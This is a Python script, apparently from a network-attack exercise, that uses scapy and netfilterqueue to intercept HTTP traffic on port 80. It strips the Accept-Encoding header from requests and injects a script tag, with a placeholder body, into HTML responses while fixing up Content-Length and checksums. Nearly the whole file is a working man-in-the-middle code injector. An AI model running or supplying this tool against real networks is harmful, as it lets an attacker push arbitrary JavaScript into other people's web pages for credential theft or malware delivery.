from scapy.layers.inet import IP, TCP
from scapy.all import Raw, Packet
import netfilterqueue
import re

# Modifies the packet content and recalculates mandatory fields
def set_load(packet: Packet, load: bytes) -> Packet:
    packet[Raw].load = load
    del packet[IP].len            # Remove IP length so Scapy recalculates it
    del packet[IP].chksum         # Remove IP checksum so Scapy recalculates it
    del packet[TCP].chksum        # Remove TCP checksum so Scapy recalculates it
    return packet

# Main function to intercept and manipulate packets
def process_packet(packet):
    scapy_packet = IP(packet.get_payload())

    # Only proceed if the packet has both Raw and TCP layers
    if not (scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP)):
        return packet.accept()

    load = scapy_packet[Raw].load

    # Intercepting HTTP requests (destination port 80)
    if scapy_packet[TCP].dport == 80:
        print("[+] HTTP Request")
        # Remove the Accept-Encoding header to prevent compression
        load = re.sub(b"Accept-Encoding:.*?\r\n", b"", load)

    # Intercepting HTTP responses (source port 80)
    elif scapy_packet[TCP].sport == 80:
        print("[+] HTTP Response")

        # JavaScript injection payload
        injection_code = b"<script>REPLACE HERE;</script></div>"
        # Inject the code before the closing </div> tag
        load = load.replace(b"</div>", injection_code)

        # Look for Content-Length header
        content_length_search = re.search(b"(?:Content-Length:\s)(\d+)", load)

        # If found and response is HTML, update the Content-Length
        if content_length_search and b"text/html" in load:
            old_length = content_length_search.group(1)
            new_length = int(old_length) + len(injection_code)
            load = load.replace(old_length, str(new_length).encode())

            print(f"Old Content-Length: {old_length.decode()} → New: {new_length}")

    # If the payload has changed, update the packet
    if load != scapy_packet[Raw].load:
        new_packet = set_load(scapy_packet, load)
        packet.set_payload(bytes(new_packet))
        # print(new_packet.show())  # Uncomment for debug info

    packet.accept()

# Start the NetfilterQueue
if __name__ == "__main__":
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    print("[*] Waiting for packets...")
    queue.run()
